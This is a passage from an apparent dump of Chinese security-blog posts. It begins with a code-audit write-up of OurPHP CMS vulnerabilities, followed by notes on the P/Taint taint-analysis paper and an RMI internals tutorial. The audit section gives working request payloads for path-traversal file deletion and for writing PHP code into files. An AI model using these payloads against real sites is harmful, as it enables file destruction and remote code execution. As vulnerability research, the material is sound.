&#123;\t\t\tfor(i=0;i&lt;elements.length;i++) &#123;\t\t\t\tthiselm = elements[i];\t\t\t\tif(thiselm.name.match(/dfile\\[\\w+\\]/))\tthiselm.checked = !thiselm.checked;\t\t\t&#125;\t\t&#125;\t&#125;\t&lt;/script&gt;&quot;;\tfbutton(&#x27;submit&#x27;,&#x27;dosubmit&#x27;,&#x27;删除并继续&#x27;);\tfbutton(&#x27;reset&#x27;,&#x27;doreset&#x27;,&#x27;重置&#x27;);\tffooter();\texit;&#125;\n\n然后保证有back_type这个参数为partsave即可\n\n\n再往上，有一个POST传参\n\naction参数需要满足databackup\n\n在往上有个eval语句，跟入看一下\n\n首先是frameset_html()，需要控制参数framename值不让程序提前结束\n\n我们在根目录创建一个目录\n\nfiledeled=1&amp;dfile[]=../../test/RacerZ&amp;back_type=partsave&amp;dir=../../function/backup/&amp;action=databackup\n\n\n任意文件写入2还是看数据库备份功能，这里用户可控参数filename被直接进行了拼接到data中，然后调用writefile()，跟进\n\n这里就有一个文件写入操作，且可以看到后缀名为.php\n\n当然这个文件的内容由于同时也会出现在文件名中，所以是否能执行依赖于不同的操作系统\n当然前面还要绕过那些exit影响的判断句，多了一个page判断\n\nfilename=1; phpinfo(); //&amp;dir=../../function/backup/&amp;action=databackup&amp;page=1&amp;back_type=partsave\n任意文件删除2Banner管理这里也支持删除功能，我们针对路由client/manage/ourphp_banner.php?ourphp_cms=del&amp;id=2看下\nOP_Adminpower不用管经过调试会满足条件；然后是outphp_rs[0]参数可以从数据库里取\n\n同时后台是提供了添加Banner的功能的，所以直接添加就好，对应会去执行\n$db -&gt; insert(&quot;`ourphp_banner`&quot;,&quot;`OP_Bannerimg` = &#x27;&quot;.$ourphp_xiegang.&quot;&#x27;,`OP_Bannertitle` = &#x27;&quot;.admin_sql($_POST[&quot;OP_Bannertitle&quot;]).&quot;&#x27;,`OP_Bannerurl` = &#x27;&quot;.admin_sql($_POST[&quot;OP_Bannerurl&quot;]).&quot;&#x27;,`OP_Bannerlang` = &#x27;&quot;.admin_sql($_POST[&quot;OP_Bannerlang&quot;]).&quot;&#x27;,`time` = &#x27;&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;&#x27;,`OP_Bannerclass` = &#x27;&quot;.admin_sql($_POST[&quot;OP_Bannerclass&quot;]).&quot;&#x27;,`OP_Bannertext` = &#x27;&quot;.$ourphp_text.&quot;&#x27;&quot;,&quot;&quot;);\n我们设置好OP_Bannerimg字段，这里先往后看\nOP_Bannerlang=cn&amp;OP_Bannertitle=a&amp;OP_Bannertext%5B%5D=b&amp;OP_Bannertext%5B%5D=c&amp;OP_Bannertext%5B%5D=d&amp;OP_Bannerimg=&lt;exploit&gt;&amp;OP_Bannerurl=http%3A%2F%2F&amp;OP_Bannerclass=0&amp;submit=%E6%8F%90+%E4%BA%A4\n这里还有一个需要满足的是查出来的OP_Webfile字段需要为2\n\n\n这里我在后台定位到功能管理模块，同样可以修改，对应的参数值为OP_Webfile\n\n\n之后就是可以利用了，后台修改对应模块内容即可\nOP_Bannerlang=cn&amp;OP_Bannertitle=a&amp;OP_Bannertext%5B%5D=b&amp;OP_Bannertext%5B%5D=c&amp;OP_Bannertext%5B%5D=d&amp;OP_Bannerimg=./function/uploadfile/../../test/RacerZ&amp;OP_Bannerurl=http%3A%2F%2F&amp;OP_Bannerclass=0&amp;submit=%E6%8F%90+%E4%BA%A4\n\n通过Banner列表展示模块可以看到新插入的id值\n\n然后访问刚才的删除路由\nclient/manage/ourphp_banner.php?ourphp_cms=del&amp;id=4\n任意文件删除3路由client/manage/ourphp_imgdel.php\n\n这个太简单了，直接删就行\nurl=./function/uploadfile/../../test/RacerZ\n参考链接https://ego00.blog.csdn.net/article/details/117818842\nhttps://y4tacker.blog.csdn.net/article/details/115794004\n","tags":["代码审计"]},{"title":"《P/Taint Unified Points-to and Taint Analysis》论文笔记","url":"/2023/02/04/PTaint%20Unified%20Points-to%20and%20Taint%20Analysis%20%E7%B2%BE%E8%AF%BB/","content":"P/Taint: Unified Points-to and Taint Analysis 精读\n前言\n本文提出的一个观点就是，信息流分析本质上等同于指针分析，只不过人工定义了需要信息源指向的抽象对象。\n两者相结合的好处体现在多个方面。首先可以在不做过多修改的情况下，直接用指针分析实现来计算污点分析；并且一些增强版指针分析（如不同版本的上下文敏感指针分析）以及处理反射的分析都可以直接用在信息流分析上。最后利用了一个 Doop 分析框架来证实这些好处。\n\nIntroduction\n污点分析可以用于检测敏感信息可能流动的位置；而指针分析回答了“程序中的对象指向关系”，是各种应用的底层分析引擎\n两者的共同点在于它们都回答了”值在程序中的流动”。不同点在于指针分析计算的是堆抽象的引用关系；而污点分析计算的是污点 source 可以影响到哪个值并且该值是否可以到达 sink 点，并且污点值的类型可以转换。\n本文提出的技术在于合并两种技术的算法细节。核心在于 changing the domain of points-to information targets 。之前的指针分析中变量指向的对象都是由堆分配，在合并的算法中，对象并不仅是源程序中预定义的，还引入了一些可动态引入的值。这种动态引入既发生在污点 source 的定义当中，也发生在污点传播过程中。算法唯一的改动实际就是操作对象当中加入了人为的 “objects”，也就是污点信息。\n作者依据提出的技术对 Doop 指针分析框架做了扩展，提出了 P/Taint 信息流框架。其增加了功能：即时计算污点值、标记污点 source、在非相关类型值之间转播污点以及值的清理。本质上采用的还是 Doop 框架的算法，增强了输入。\nP/Taint 框架的优势：\n\nP/Taint 无需对原有 Doop 框架代码作过多修改，而其他增加的功能都是如附属插件一样灵活加入，很好的适用于多种框架分析\n继承了 Doop 框架提供的多种分析方式，以及多种上下文敏感方式，为信息流分析提高了精度，减少误报\nP/Taint 继承了 Doop 框架提供的针对 Java 语言的多种高级特性分析，使得信息流分析能检测出更多的漏洞，降低漏报\n\n\nBackground and Illustrations\n\n指针分析基础\n指针分析计算的是程序中的表达式所指向的抽象对象。抽象对象通常由调用点来标识，调用点就是如 new 实例对应的指令执行分配的：这里还会分上下文敏感和非上下敏感，对于前者，所有运行时对象如果是同一指令分配的则会映射到同一抽象对象，也就是忽略了上下文堆抽象。\n指向分析的源头就是从一个分配指令开始\nA a1 = new A(); // heap allocation/abstract obj.\n指向分析将简单地推断局部变量 a1 可以指向用上述 new 语句标识的抽象对象。指向分析的精髓实际上在于计算这些抽象对象如何在不同语言构建上流动，下面以方法的调用、返回和局部赋值语句以及堆抽象对象的 loads 和 stores 为例：\nObject p = foo();bar(p);B b1 = p.fld;...A foo() &#123;A a1 = new A(); // abstract object A1return a1;&#125;void bar(Object q) &#123;A a2 = (A) q;a2.fld = new B(); // abstract object B1&#125;\n在这个例子中局部变量 a1, p, q 和 a2 都可以指向抽象对象 A1，而局部变量 b1 指向抽象对象 B1。最终，抽象对象 A1 通过方法调用和返回流动， B1 通过抽象对象的 loads 和 stores 流动。\n指针分析算法的精髓就在于能尽可能精确的推断出对象流动（may analysis）。其分析结果是一个变量和它所指向的所有抽象对象（调用点）的映射 map.\n\n信息流分析基础\n信息流分析计算的是哪些作为 source 的数据产生的值可以到达特定的数据 sinks 处。它通常用在分析实际的安全和隐私问题上：计算哪些污点数据源 sources 可以产生污点数据用在可信计算上（类似越权、非授权）；以及一些非授权访问、信息泄露的场景。\n信息流分析计算的起点通常是一个作为 source 点的 API调用，比如下面是一个接收用户输入字符串的代码：\nString a = source.readLine();  // taint source\n信息流分析的精髓在于追踪所有在程序当中传播的污点值。这里要区分污点和对象的概念。污点关心的是其数据的值，而不是它们在内存中的位置（或者说堆分配方式）。\n因而，相同的污点可以通过不同的对象类型传递。它通常是利用的数据转换函数来传递的，如：\nString a = source.readLine();  // taint sourcebyte[] aAsBytes = a.getBytes();\n可以看到尽管 a 和 aAsBytes 变量的类型不同，但是拥有同一污点 source。污点字符串值产生了污点字节数组，但实际上污点的内容没有丢失。\n最后，污点可以通过 sanitization 函数移除。如：\nString a = source.readLine (); // taint sourceString aSafe = java.net.URLEncoder.encode(a, &quot;UTF -8&quot;);\n相似点：都计算了对象在程序中的流动\n区别：\n\n对于指针分析，流入变量的值是抽象对象（调用点）；对于信息流分析，代表的是污点 sources （方法调用）。\n污点和对象的同一性是截然不同的概念。同一个污点可以施加到不同的对象上。而同一个抽象对象可以代表具体的污点对象也可以是非污点对象。同一对象可以在其生命周期的不同点处或污染或不被污染。Sanitization 和 数据转换函数并未在指针分析中涉及。\n\n兼容方法：\n对象通过方法调用和堆的流动与原先指针分析算法一样，增加了一些值但是保持原来的处理逻辑：识别出所有的信息流 sourses 和数据转换函数，通过手动构造抽象对象，让原有的指针分析算法按照和之前调用点抽象的处理逻辑一样进行分析。\n还拿刚才的例子：\nString a = source.readLine ();// artificial abstract objectbyte[] aAsBytes = a.getBytes ();// parametric artificial abstract object\n联合的分析会视 readLine 方法调用为手动构造的抽象对象的 source。手动构造对象表示一个特定的污点，它作为一个值与常规对象一起传递。手动构造的抽象对象和指针分析中的抽象对象实质是正交的，也就是说如果一个变量同时指向这两种抽象对象，那么说明该变量接收了一个指定调用点分配的污点对象（污点信息指向标记的 source）.\n类似地，对于数据转换函数的调用也会手动构造 sources 的抽象对象，区别在于为了保存每一个污点值，需要对每一个传入调用的污点值都构造一个抽象对象。\n对于 sanitization 函数，只会控制 inter-procedural 传播涉及到的手动构造的抽象对象。污点值不会流入 sanitization 方法。实际上这个是原有指针分析算法逻辑为了支持联合分析所需做出的少部分改动： inter-procedural 传播在涉及到 sanitization 函数调用时需要过滤掉所有涉及的手动构建的抽象对象。\n\nAnalysis Design \n这部分参考 Datalog\n下面我们在一个模型上展示联合分析：最小输入语言上的基于逻辑的规范（在 Datalog 语言的语法中，等同于具有递归的一阶逻辑）。提出的模型是对标准逻辑规范的增量添加，用于Andersen风格的指针分析。它集成了几乎所有指针分析算法，并且可以增添许多特征。这些添加相对于我们对基本模型的最小更改是可以忽略的。所以这允许信息流分析可以联合不同种类的指针分析。\n\nFrom Pointer to Information-Flow Analysis\n首先忽略数据转换函数和 sanitization，先讨论如何将信息流分析和指针分析作同步。\n下面图1展示了分析中的 domain，包括输入，关系运算和输出，以及产生新污点值的构建函数。图2代表分析。\n红色框住的元素代表修改了用于支持信息流分析的部分，其余为参数和谓词的别名。语法规则：左箭头将推断出的 facts 和已知的 facts 分隔开\n\n\n模式变更：定义值抽象 A , 包括指针分析中的调用点抽象 $A_H$ 和 污点值抽象 $A_T$.     它们都代表程序当中值引入的位置；重命名指针分析的输出关系 $V_{AR}P_{OINTS}TO$ 和 $F_{LD}P_{OINTS}TO$ 为 $F_{LOWS}T_{O}V_{AR}$ 和 $F_{LOWS}T_{O}F_{LD}$ . 也就是说之前所有的堆抽象概念转变为统一的值抽象\n算法变更：在图2中，前8条规则时标准的上下文敏感指针分析模型。唯一的变化是在计算调用图上 (谓词 $C_{ALL}G_{RAPH}$). 在计算 virtual calls 的 receiver objects 时不是所有的值抽象都用到：因为 receiver objects 必须是标准的堆抽象。这个检查可以避免分析到达一些不可达的方法，虽然说污点对象看起来在调用点调用了。这个原因在于污点值抽象和堆抽象在传播规则上略有不同，后者的规则中引入了即使在正常对象不会传播的情况下也可以促进污点值流动的捷径。\n最后两个规则时新引入的。它们只是将对信息 sources 的调用标记为创建抽象值的点，将对信息 sinks 的调用标记为泄漏点，并将其作为输出的一部分进行报告。\n前两个规则中的第一条说明了当 source 方法(利用输入谓词 $S_{OURCE}M_{ETHOD}$)计算得到是可达的话（利用 $C_{ALL}G_{RAPH}$），那么接收返回值的变量将会指向一个新的抽象值。新的构造函数的引入是通过构造函数 $N_{EW}T_{AINTED}V_{ALUE}$. 这个构造函数是分析的一个参数化点，但通常将其定义来保留传递给它的所有信息。\nNewTaintedValue(invo, type) = pair(invo, type) : AT\n也就是说，新的抽象值回同时去编码调用点和值的类型。污点可以从一个值抽象转移到另一个值抽象，稍后我们将看到这种编码如何帮助确保值抽象只会拥有单一类型。调用点记录可以获知程序中最初引入污点值的位置。\n最后一个规则只是对分析结果的利用。它表述了如果抽象的污点值到达了 sink 函数调用点的第i个参数上，且第i个参数是敏感的话，则会导致信息泄露（$S_{INK}M_{ETHOD}(meth,i)$）。\n\nFlow-Through Data Transform Functions\n\n图3的引入是为了支持数据转换函数能够使得污点信息在不同数据类型的值之间传播，这里定义了一些额外的规则和逻辑来表示污点对象的创建。要指出这里只是列出了一些典型的污点转换规则，在 P/Taint 中定义了更多方式（这里说的也就是污点传播方式，tai-e 中有特别说明）。\n图3中定义了两种新的输入关系，BaseToRetTransfer 和 ArgToRetTransfer，一个中间谓词 IsTaintedFrom，和新的构建函数 TransferTaint. 新的输入关系编码了方法返回值的污点传播方式，或者是方法调用的 receiver variable（base variable），或者是参数传递。为了方便，会列出新的污点值类型。前两条规则中将输入信息组合为更一般的中间谓词，IsTaintedFrom(from,to,type) 捕获了哪些变量作为输入以及新产生的污点值及其类型\n图中的第三个规则负责处理在现有污点值流向转换函数时创建新的污点值。这个规则体中有个细节：新的污点值并不是在转换函数返回点处产生（对应变量 to），而是只要污点对象流到该点，且该点为堆对象第一次分配和赋值处。\nTransferTaint 构造函数用来创建新的污点值，它是分析模型的一个参数：不同的定义将决定创建多少污点抽象对象，进而影响精度和扩展性。一个合理的定义如下：\nTransferTaint(value, type) = pair(first(value), type) : AT\n也就是说，新的污点值会编码输入污点值的前半部分（即原始污点 source 的调用点）以及新产生污点值的类型。\n\nSanitization Functions\nSanitization 函数的处理要阻止所有污点值流过其预定义函数。因此引入新的输入关系，SanitizationMethod 并且修改了跨函数赋值的逻辑。\n可以看到这个规则在处理堆抽象的传播时逻辑不变，而污点值只有当赋值语句的左边变量（也就是变了 to）是 Sanitization 函数的显式参数时才会传播。\n\n\nScaling to a Full Taint Analysis Framework: Benefits\n前一部分构建的模型是 P/Taint 框架的基础，下面将描述如何将方法拓展至实际的编程语言以及其中的优势\n\nBroad Support of Java Semantics\n首先前面所提到的最小模型是不足以支持完备的针对 Java 字节码语言的安全分析的。对于其高级特征的建模将会对静态分析的复杂性大大提高（指数级），但是也能提高性能。\n对于联合指针分析和信息流分析的方法来分析这些复杂语义的一大好处就是它们只会被处理一次。本质上，所有对于语言语义的建模都只关注值的流动，并且是不变的，而不会管这些值是堆对象还是污点对象。\n\nReflection\nP/Taint 继承了 Doop框架针对反射的支持\n\nContext Sensitivity and Precision\n我们可以通过上下文敏感来提供指针分析的精度：通过上下文信息来量化变量和抽象对象，因而不会对不同方法调用点的对象或者同一抽象对象作合并。\n首先，Doop 中已经有一套成熟的模式在规则中添加上下文敏感信息，而且通过定义构造函数 Record 和 Merge 该模式允许插入不同的上下文模型（call-site / object / type / hybrid）.\n下图中展示了图2中上下文敏感形式的 CallGraphEdge\n\nMerge 用于创建 virtual 调用点的新的调用上下文。这些上下文信息用来量化方法调用，即它们将施加到方法中的所有局部变量上。Merge 函数将会获取 virtual 方法调用点的所有信息并合并创建一个新的上下文\n\nOther Pragmatic Features\n实用特征之一是能够标记 sources 和 sinks 。标记的实现是利用的 NewTaintedValue 构造函数，其参数包含 source 的标签，对污染值的来源进行索引，以便在查询 FlowsTo 时可以检索标签\n其次是支持 breadcrumbs，也就是关联污点抽象值来帮助用户调试应用中的信息流。信息流中间步骤信息的添加是通过污点传播规则和函数来实现的，TransferTaint 构造函数会获得一系列预定义的 breadcrumbs 和 当污点数据发生转移时保存的抽象值信息。这些breadcrumbs 可以随后处理并通过查询拼接展示完整的信息流。\n\nOverall Benefit\n实际上就是说代码更改的地方不多，大多修改的地方是在配置 sources 和 sinks 上（利用正则表达式表示）。指针分析部分的代码已经能很好的处理污点抽象对象的传播\n\n\nDiscussion\n\nContrast whith Conventional Approaches\n对于传统的基于 Datalog 的污点分析，是指针分析的应用。它定义的关系当中会有一些相对于 P/Taint 定义的关系拆分的形式，导致重复的工作产生（性能）。\n而对于 P/Taint 联合方法的一个特征在于是将污点表示为独立于常规对象（指堆抽象对象）传播的新抽象值（规则一样）。与之对比，在传统的 Datalog 分析当中，对象的分配使用污点值作标记（利用独立的输入关系 IsPrivileged(obj, taintType)），这样的决策只是利用了指针分析的结果，而没有任何增强的表现。\n通过在堆抽象对象的分配点标记污点，指针分析将只能传播对象（就好像不考虑污点一样）。污点分析就可以观察对象在哪里传播以及传播的最大限度。在传统的 Datalog 分析中，这意味着只要对象指向污点对象（甚至没有从污点对象的 fields 中获取值）就已被视作污点。\n对于传统的安全分析框架，P/Taint 框架提供了一套更普适的全程序分析框架，它为程序的依赖库也提供了分析。相反一些安全分析框架需要额外设定模型来分析程序的环境，这当然是不完备的。P/Taint的指针分析思路是流向底层数据结构，这样对污点的传播非常有效，特别是在分析一些开源产品的时候。后者常会用一些第三方组件或者自定义数据结构，而不是标准的 collections 库。\n\nLimitations\n\n模型限定了只会使用流不敏感分析\n分析模型没有采用 access-path-based 公式。access paths 是形式如 var(.fld)* 这样的表达式。它可以在指针分析中表现在概念如”这个 access path 指向这个值” 或者 “这个 access path 是别名”，拓展到污点分析就是计算被污染的以及别名 access paths。这种概念有利于进行模块化分析，避免了计算整个程序的堆映像\n\n\nPractical Elements\n下面是一些实践应用\n\nAndroid Support\n\nConventional Java Program Support\nP/Taint 支持对 servlet 应用的分析。利用的是针对开源程序的分析特性，也就是程序有多个公共的入口点而不是单一的 main 方法启动。因此分析只需对环境进行精确建模来构建准确的调用图，包括支持添加所有的 servlets 入口点到调用图上，以及实例化 servlet 应用的环境变量。\n另外，通过对 java.lang.String 类内部进行建模，引入了一些针对字符串操作的通用处理。这种建模使得污点派生自内部字段 char[] value，意味着一旦字符串对象被污染了，其内部的字符数组也会被污染，反之亦然。由于这种方法只会作用于纯 Java 操作，因此如果是依赖于 native 代码的字符串操作则需要显式建模。对于对象的序列化和反序列化也是这样。\n\n\n\nEvaluation\n针对下面四个问题开展实验评估：\n\n是否低误报？\n是否低漏报？\n相比于其他工具，是否在信息流分析检测中表现更高的精度\n是否可扩展以及在运行时间上高效\n\n实验装置上一套作为基准对照，已经做过信息泄漏的标记且源代码可知；另一套是开源程序：大规模Android应用程序，没有标记信息流。\n\nControlled Benchmarks\n我们采用了以下几个控制基准：\n\nSecuriBench Micro 包含了122标记的可能安全缺陷的 servlets\nJInfoFlow-bench 采用了反射、事件驱动架构以及流行的软件设计模式\nDroidBench 2.0 多个 Android 安全风险\n\n对于 SecuriBench Micro 的测试，由于 P/Taints 支持开源程序的特性（自动添加所有入口点到调用图上），所以不需要为每一个 SecuriBench 应用手动编写测试样例。其会同时分析完整的程序套件，结果基本一致\n对于 JInfoFlow-bench 的测试，其提炼出了很多 Java 程序中难以分析的特征，需要高精度的分析以及支持反射特性的信息流检测。这个基准套件绝大多数行为并未依赖于外部库的使用，因此很难专门写一个安全优化分析出来\n对于 DroidBench 2.0 的测试，P/Taints 未对其中的 implicit-flow 套件以及 emulator detection 套件作实验评估，后者更适于用动态分析来检测应用在竞争条件下的行为差异，而前者更适于对控制依赖建模的污点分析（流敏感）\n\nOverall Effectiveness\n结果如下：\n\n\n总体表现出了高精度和低误报。误报的来源在于 P/Taint 非流敏感或者 path 敏感，以及数组敏感（不区分数组索引）\n\nSensitivity Analysis: Precision\n用不同的上下文敏感支持来运行 SecuriBench Micro 以及 JInfoFlow-bench benchmarks 下面的图中展示了精度分数。\n可以看到在我们联合分析的方法中，无需做更多代码上的更改，仅需选择不同的上下文敏感分析，就可以在精度和可扩展性之间做权衡。\n\n\n还有一些其他的发现：\n\n在不同的环境下，不同的上下文敏感方式展现出不同的精度优势\n上下文敏感的方式对于一些并不是用来测试上下文敏感的样本（用到了JRE中的复杂数据结构）也能展现出很好的效果。依靠的就是 P/Taint 对于全 Java 语言语义的支持以及优秀的上下文敏感策略\n\n\nSensitivity Analysis: Recall \n反射是影响现实信息流分析样本召回率的主要特征，我们通过是否使用 P/Taint 的反射支持来作对比。这里提一句反射的支持利用的 Doop 提供的技术（利用 substring analysis + use-based analysis）.  \nJInfoFlow-bench 测试样本中包含更多的基于反射的行为，图示中可以看到影响变化。\n\n\nSensitivity Analysis: Running Time\n图示中展示了不同的测试样本在不同分析参数下运行所需的时间。注意图表中的两部分并不在同一尺度上，首先对于 open programs 的支持使得对于所有 SecuriBench 的程序可以同时并行分析，导致更快的运行时间。而对于其他样本，都是单独分析，因此总时间达到几十分钟。\n\n\n总体来看，虽然反射会使得分析时间加倍，但是还是高性能的。\n\nUnifiedAnalysis vs. Points-To\n最后，我们记录了一些联合分析与原始指针分析在性能度量上的对比。已知两者算法逻辑的核心是一样的（指针分析），只不过前者会处理更多的抽象对象。所以我们展现了分析中通过推断“流入”污点抽象对象以及堆抽象对象的相对占比。\n\n图示中表示了 FlowsToVar 关系的大小（除去了上下文信息），其中分成指向抽象污点对象的元组和指向抽象堆的元组。经过不同精度的多次分析，我们可以看到污点对象流也是整个计算的重要占比。这证实了污点传播并不是底层分析逻辑的附加任务，即使只是少量的污点 sources，也能同堆抽象对象流产生的分析推断相竞争。\n\n\n\nRelated Work\n\n利用污点分析\n\n\n探索利用 Datalog 进行污点分析（未使用联合的方法）\nBenjamin Livshits. 2006. Improving Software Security with Precise Static and Runtime Analysis. Ph.D. Dissertation. Stanford University\n\n提出污点分析是一种需求驱动的问题，而非完整的全程序指针分析流\nOmer Tripp, Marco Pistoia, Patrick Cousot, Radhia Cousot, and Salvatore Guarnieri. 2013. ANDROMEDA: Accurate andScalable Security Analysis of Web Applications\n\n\n\n程序依赖图的使用\n控制依赖图对检测信息流中的隐式控制依赖比较有帮助\n\n动态语言的分析研究\n\n一种通用的分析组合模式是以交织的方式来执行两种分析（互相反馈）这个区别于本文提出的方法，后者利用的是一个分析的逻辑来执行另一个分析，而不是同时对两个分析进行评估，并且底层的指针分析结果并不受额外加入的污点抽象对象的影响。\n\n\n\n\n\n\n","tags":["软件漏洞分析"]},{"title":"RMI浅析","url":"/2023/01/22/RMI/","content":"RMI Introduction\nRMI (Remote Method Invocation) 远程方法调用，顾名思义，是一种调用远程位置的对象来执行方法的思想。实现思想就是让我们获取远程主机上对象的引用，我们调用这个引用对象，但实际方法的执行在远程位置上。\n为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。\n\n\n调用时序图如下：\n\n\n\nRMI接口的要求：\n\n\n定义一个能够远程调用的接口，该接口需要继承java.rmi.Remote\n用来远程调用的对象作为这个接口的实例，也将实现这个接口\n这个接口中的所有方法都必须声明抛出 java.rmi.RemoteException 异常\n\n\nRMI接口实现的要求：\n\n\n继承java.rmi.server.UnicastRemoteObject 类\n\nRMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 equals/hashcode/toString 方法。这里必须为这个实现类提供一个构造函数并且抛出 RemoteException。\n\npublic class RemoteObject extends UnicastRemoteObject implements RemoteInterface &#123;\tprotected RemoteObject() throws RemoteException &#123;\t&#125;\t@Override\tpublic String sayHello() throws RemoteException &#123;\t\treturn &quot;Hello My Friend&quot;;\t&#125;\t@Override\tpublic String sayHello(Object name) throws RemoteException &#123;\t\treturn name.getClass().getName();\t&#125;\t@Override\tpublic String sayGoodbye() throws RemoteException &#123;\t\treturn &quot;Bye&quot;;\t&#125;&#125;\n\n不继承1中的类的话，需要主动的使用该类的静态方法exportObject，来手动导出export对象\n\n\n\nRegistry 实现方式有两种\n\njava.rmi.Naming\n提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，有一个URL格式的参数需要说明：格式如//host:port/name\n\n\nhost 表示注册表所在的主机\nport 表示注册表接受调用的端口号，默认为 1099\nname 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字\n\n\n实际上它是对接口java.rmi.registry.Registry的封装，该类主要是对注册表进行操作，本质调用的是LocateRegistry.getRegistry 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的\n\njava.rmi.registry.Registry接口\n其存在两个实现类RegistryImpl 和RegistryImpl_Stub\n\n\n\ndemo\n注册中心\npublic class Registry &#123;    public static void main(String[] args) &#123;        try &#123;            LocateRegistry.createRegistry(1099);            System.out.println(&quot;Server Start&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n远程调用接口\npublic interface RemoteInterface extends Remote &#123;    public String sayHello() throws RemoteException;    public String sayHello(Object name) throws RemoteException;    public String sayGoodbye() throws RemoteException;&#125;\n远程调用接口实现\npublic class RemoteObject extends UnicastRemoteObject implements RemoteInterface &#123;    public RemoteObject() throws RemoteException &#123;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        return &quot;Hello My Friend&quot;;    &#125;    @Override    public String sayHello(Object name) throws RemoteException &#123;        return name.getClass().getName();    &#125;    @Override    public String sayGoodbye() throws RemoteException &#123;        return &quot;Bye&quot;;    &#125;&#125;\n服务端\npublic class RemoteServer &#123;    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException &#123;        RemoteInterface remoteObject = new RemoteObject();        Naming.bind(&quot;rmi://localhost:1099/Hello&quot;, remoteObject);    &#125;&#125;\n客户端\npublic class RMIClient &#123;    public static void main(String[] args) throws RemoteException, NotBoundException &#123;        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);        // Returns an array of the names bound in this registry        System.out.println(Arrays.toString(registry.list()));        RemoteInterface stub = (RemoteInterface) registry.lookup(&quot;Hello&quot;);        System.out.println(stub.sayHello());        System.out.println(stub.sayGoodbye());    &#125;&#125;\n\n\n特性说明\n\n动态类加载机制：这里主要是调用方法的参数在服务端不存在的情况，而其又是一个可序列化对象。默认会抛出ClassNotFound异常，但是RMI添加了支持，需要设置一个java.rmi.server.codebase，则会尝试从其中的地址获取.class并反序列化\n\n设置java.rmi.server.codebase可通过System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;); 进行设置，或使用启动参数 -Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot; 进行指定。\n同时，还需要设置安全策略。通过安全管理器设置了安全管理之后，RMI才允许动态加载任何类\nif (System.getSecurityManager() == null) &#123;    System.setSecurityManager(new RMISecurityManager());&#125;\n\n管理器应与管理策略相辅相成，所以我们还需要提供一个策略文件，里面配置允许那些主机进行哪些操作，这里为了方便测试，直接设置全部权限：\ngrant &#123;    permission java.security.AllPermission;&#125;;\n同样可以使用 -Djava.security.policy=rmi.policy 或 System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString()); 来进行设置。\n\n\n\n\n\n源码分析\n\n服务注册\n\n远程对象创建\n\n细节：\nRemoteObjectInvocationHandler 动态代理，继承了RemoteObject并实现InvocationHandler下面是 invoke 方法的实现：如果方法是属于Object的话则调用invokeObjectMethod()，其他的则调用invokeRemoteMethod()\n\ninvokeRemoteMethod()实际是委托 RemoteRef 的子类 UnicastRef 的 invoke 方法执行调用\n\n跟进可以看到，其执行流程是通过LiveRef属性来建立连接，执行调用，获取结果并进行反序列化\n\n具体反序列化方法位于unmarshalValue()\n\n\n注册中心创建\n入口处位于LocateRegistry.createRegistry(1099); 其首先会创建一个RegistryImpl对象，端口指定\n\n其中创建了LiveRef()对象以及UnicastServerRef()对象，并通过调用setup进行配置\n\nsetup 方法调用了UnicastServerRef类的 exportObject 方法来export对象，这次导出的为RegistryImpl\n\n跟进依旧会通过Util.createProxy()来创建动态代理，在远程对象注册时其创建的是RemoteObjectInvocationHandler()这里区别的一点是会有stubClassExists()的判断\n\n判断基于本地是否存在_Stub的类，这里是因为存在RegistryImpl_Stub类的，因此会返回 true\n\n那么在createStub()中就会通过反射创建RegistryImpl_Stub类实例。该类继承了RemoteStub，且是Registry的实现类，我们查看bind方法可以看到是通过序列化的方式来实现的\n\n​    创建完代理Stub后，还会调用setSkeleton()\n\n其中会调用Util.createSkeleton()来创建Skeleton对象，本质也是反射创建实例化 RegistryImpl_Skel 这个类，之后设置到UnicastServerRef的skel属性上\n\n查看 RegistryImpl_Skel 这个类可以看到，其通过dispatch()方法来分发操作\n\n\n服务注册\n服务注册就是bind的过程。这里有两种情况：\n当服务端和注册中心在同一端时，可以直接通过 Registry 的 bind 方法进行绑定，具体调用的是RegistryImpl.bind()，其维护了一个Hashtable来进行名字和远程对象的映射\n\n当服务端和注册中心不在同一端时，Naming绑定和LocateRegistry绑定的方式都是通过调用了 LocateRegistry.getRegistry() 方法来创建 Registry\n\n\n\n服务发现\n这里首先说一下 LocateRegistry.getRegistry() 创建 Registry 的流程：\n\n\n首先在本地创建了一个包含了具体通信地址、端口的 RegistryImpl_Stub 对象这里和上述注册中心注册时逻辑差不多\n通过调用这个本地的 RegistryImpl_Stub 对象的 bind/list… 等方法，来与 Registry 端进行通信\n而 RegistryImpl_Stub 的每个方法，都实际上调用了 RemoteRef 的 invoke 方法，进行了一次远程调用连接\n这个过程使用 java 原生序列化及反序列化来实现\n\n\n在RegistryImpl_Stub对象的bind方法中我们可以看到，其先建立连接，然后序列化数据并写入流，然后执行this.ref.invoke()\n\n实际调用的是UnicastRef#invoke()\n\n这里调试的时候发现marshalCustomCallData是空方法，也就是不应该调用这个方法。su18师傅的解释是：\n\n使用 sun.rmi.server.MarshalOutputStream 封装后会使用动态代理类来替换原始类\n\n原来是在writeObject()的过程中替换的，相当于包装了输出流\n\n动态代理类替换原始类\n\n\n根据 Registry 的 host/port 等信息创建本地 RegistryImpl_Stub，然后调用其 bind 方法向 Registry 端使用 writeObject 写入 name 